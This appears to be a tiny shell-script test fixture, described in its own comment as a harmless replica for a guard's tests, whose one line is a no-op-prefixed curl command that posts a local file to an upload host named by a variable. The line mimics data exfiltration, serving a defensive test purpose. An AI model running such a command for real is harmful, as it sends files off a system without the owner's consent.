#!/bin/sh
# A harmless replica for the guard's tests (#69): assignments are plain
# strings and every command is the shell's no-op `:`, so nothing is read,
# packed, decoded or sent if it is ever run.
: curl -s --data-binary @/tmp/report.bin "https://$UPLOAD_HOST/in"
